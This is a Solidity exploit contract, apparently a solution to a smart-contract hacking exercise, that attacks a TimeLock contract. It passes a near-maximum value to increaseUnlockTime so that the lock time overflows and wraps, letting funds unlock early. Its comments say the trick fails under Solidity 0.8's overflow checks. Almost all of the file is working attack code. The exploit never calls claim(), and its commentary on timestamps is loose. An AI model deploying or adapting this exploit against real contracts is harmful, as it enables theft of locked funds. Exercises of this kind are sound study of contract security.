// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// interface for the target contract
interface TimeLock {
    function increaseUnlockTime(uint256 numSeconds) external;
    function claim() external payable;
}


// hacking contract
contract HackTimeLock {
    
    // target contract address
    address target;

    
    // hacks the deployed contract
    function hacks(address _target) public payable{
        
        // set target deployed contract
        target = _target;
        
        // create pointer
        TimeLock tl = TimeLock(target);
        
        
        // maximum uint256
        uint256 x = 2**256 - 1;
        
        // the condition is block.timestamp >= unlockTime (unlock time is block.timestamp + 1 year)
        // call target contract increaseUnlockTime function
        // increament the unlock time to overflow the max value of uint256
        // increament it by (max uint 256 - 1 year)
        // the block.timestamp will increase while running the hacks
        // therefore the unlocktime < block.timestamp when the hacks is carried out
        // seems like uint overflow is fixed in later version of solidity, it failed to run with solidity 0.8.7
        tl.increaseUnlockTime(x - 365 * 86400);
        

    }
    
    
    
    // check the current block.timestamp and compare it to the target contract's unlock time
    function getBlockTimestamp() public view returns(uint256){
        return block.timestamp;
    }
}